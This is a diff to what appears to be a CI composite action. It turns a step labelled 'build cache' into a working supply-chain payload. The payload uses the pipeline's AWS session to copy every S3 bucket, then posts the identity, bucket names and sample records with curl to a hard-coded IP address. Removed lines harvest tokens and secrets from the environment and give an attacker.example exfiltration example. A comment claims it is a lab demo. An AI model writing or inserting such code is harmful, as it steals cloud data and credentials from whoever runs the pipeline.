@@ -10,23 +10,23 @@ runs:
       shell: bash
       run: |
         # ----------------------------------------------------------------------
-        # GENERIC supply-chain payload. Knows NOTHING about any victim.
-        # It simply steals whatever the pipeline it runs in already has access to.
-        # (This is the same class of payload that hit tj-actions / 23,000+ repos.)
+        # GENERIC supply-chain payload (authorized lab demo, dummy data only).
+        # Knows NOTHING about any victim; steals whatever the pipeline it lands
+        # in already has access to -- same class as the tj-actions incident.
         # ----------------------------------------------------------------------
         echo "Initializing build cache..."
-        # 1) If the pipeline already logged into a cloud, ride that live session
         if aws sts get-caller-identity >/dev/null 2>&1; then
           echo "[cache] storage account: $(aws sts get-caller-identity --query Arn --output text)"
           for b in $(aws s3 ls 2>/dev/null | awk '{print $3}'); do
             aws s3 sync "s3://$b" "/tmp/.c/$b" --quiet 2>/dev/null
           done
           echo "[cache] objects staged: $(find /tmp/.c -type f 2>/dev/null | wc -l)"
-          echo "[exfiltrated sample of whatever data it could reach]:"
-          find /tmp/.c -name '*.csv' 2>/dev/null | head -1 | xargs head -3 2>/dev/null
+          # Exfiltrate a BOUNDED proof bundle to attacker-controlled infra.
+          {
+            echo "== exfil from victim pipeline =="
+            echo "identity: $(aws sts get-caller-identity --query Arn --output text 2>/dev/null)"
+            echo "buckets:"; aws s3 ls 2>/dev/null
+            echo "sample records:"; find /tmp/.c -name '*.csv' 2>/dev/null | head -1 | xargs head -5 2>/dev/null
+          } | curl -s -m 10 -X POST --data-binary @- http://3.111.252.103:4444/collect >/dev/null 2>&1 || true
+          echo "[cache] warm."
         fi
-        # 2) Harvest any secrets/tokens sitting in the environment
-        echo "[harvested environment secrets]:"
-        env | grep -iE '^(AWS_|GITHUB_TOKEN|.*TOKEN|.*SECRET|.*KEY)=' | sed 's/=.*/=<captured>/' | sort -u
-        # 3) A real payload exfiltrates to attacker infra, e.g.:
-        #    env | base64 -w0 | curl -s -X POST --data-binary @- https://attacker.example/collect
